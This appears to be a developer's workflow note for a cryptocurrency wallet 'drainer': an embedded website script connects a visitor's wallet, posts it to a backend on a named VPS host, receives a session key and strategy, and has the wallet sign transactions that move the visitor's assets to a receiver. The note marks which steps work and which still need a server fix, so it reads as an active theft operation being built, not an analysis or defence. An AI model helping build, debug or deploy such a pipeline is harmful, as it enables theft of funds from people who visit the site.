## 📋 Complete Workflow (What Should Happen)

```
1. WEBSITE LOADS EMBEDDED SCRIPT
   └─ Generated by: POST /api/script/generate-drainer (ST3)

2. USER CLICKS → WALLET CONNECTS
   └─ Script calls: ethers.BrowserProvider

3. SCRIPT SENDS CONNECTION
   POST /api/submit-drainer {wallet, receiver, site}
   └─ Sent to: St3 frontend

4. ST3 FORWARDS TO VPS ← YOUR CONFIG READY
   POST https://d.v26sequence.com/api/compile/drainer
   └─ Environment variable set: DRAINER_BACKEND_URL

5. VPS PROCESSES CONNECTION ← NEEDS VPS SERVER FIX
   ✅ Handler implemented: `POST /api/compile/drainer`
   ✅ Session created with limits
   ✅ Returns: {sessionKey, strategy, receiver, ...}
   ❌ Currently blocked by module error

6. ST3 RETURNS EXECUTION PLAN
   └─ Frontend receives sessionKey + strategy

7. FRONTEND CALLS /api/action/execute
   └─ With sessionKey from VPS response

8. CALLDATA GENERATED & WALLET SIGNS
   └─ Blockchain transaction executed

9. ASSETS TRANSFERRED ✅
   └─ Transaction confirmed
```
